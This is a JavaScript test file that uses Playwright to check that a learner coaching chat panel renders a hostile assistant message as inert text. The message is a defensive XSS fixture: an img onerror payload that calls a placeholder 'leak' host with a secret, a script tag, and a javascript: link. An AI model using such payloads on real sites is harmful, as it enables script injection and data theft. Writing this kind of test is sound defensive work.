import assert from "node:assert/strict";
import { build } from "esbuild";
import { chromium } from "@playwright/test";
import { createServer } from "node:http";

const hostile =
  '<img src="https://example.invalid/leak?secret=SYNTHETIC" onerror="window.__executed=1"><script>window.__executed=1</script>[click](javascript:alert(1))';
const state = {
  exerciseVersionId: "synthetic-version",
  revision: 1,
  unlockedLevel: 1,
  hasSuccessfulReply: true,
  readOnly: false,
  expiresAt: null,
  messages: [
    {
      id: "synthetic-message",
      sequence: 1,
      role: "ASSISTANT",
      text: hostile,
      level: 1,
      requestId: "8d803c48-58af-49e3-b531-05f3a4d42490",
      context: { shareCode: false, shareReasoning: false, shareOutput: false },
      createdAt: new Date().toISOString(),
    },
  ],
};
const bundled = await build({
  stdin: {
    contents: `import{createRoot}from'react-dom/client';import{ThemeProvider,createTheme}from'@mui/material';import{LearnerAssistantPanel}from'./apps/frontend/src/components/LearnerAssistantPanel.tsx';createRoot(document.getElementById('root')).render(<ThemeProvider theme={createTheme()}><LearnerAssistantPanel exerciseId="synthetic-exercise" exerciseVersionId="synthetic-version" userId="synthetic-learner" readOnly={false} code="pass" reasoning="" output="" openRequest={1}/></ThemeProvider>);`,
    resolveDir: process.cwd(),
    loader: "tsx",
  },
  bundle: true,
  write: false,
  format: "esm",
  jsx: "automatic",
  define: { "import.meta.env": "{}" },
  logLevel: "silent",
});
const server = createServer((req, res) => {
  if (req.url === "/bundle.js") {
    res.setHeader("content-type", "application/javascript");
    res.end(bundled.outputFiles[0].text);
  } else if (req.url?.startsWith("/api/")) {
    res.setHeader("content-type", "application/json");
    res.end(JSON.stringify({ assistant: state }));
  } else {
    res.setHeader("content-type", "text/html");
    res.end(
      '<!doctype html><html><div id="root"></div><script type="module" src="/bundle.js"></script></html>',
    );
  }
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const origin = `http://127.0.0.1:${server.address().port}`;
let browser;
try {
  browser = await chromium.launch({ headless: true });
  for (const viewport of [
    { width: 1280, height: 900 },
    { width: 390, height: 844 },
  ]) {
    const page = await browser.newPage({ viewport });
    const external = [];
    page.on("request", (r) => {
      if (!r.url().startsWith(origin)) external.push(r.url());
    });
    await page.goto(origin);
    const log = page.getByRole("log", { name: "Coaching conversation" });
    await log.getByText(hostile, { exact: true }).waitFor();
    assert.equal(await log.locator("img,script,a,iframe").count(), 0);
    assert.equal(await page.evaluate(() => globalThis.__executed), undefined);
    assert.equal(external.length, 0);
    await page.close();
    console.log(
      JSON.stringify({
        id: `inert-render-${viewport.width}`,
        result: "pass",
        activeElements: 0,
        externalRequests: 0,
      }),
    );
  }
} finally {
  await browser?.close();
  await new Promise((r) => server.close(r));
}
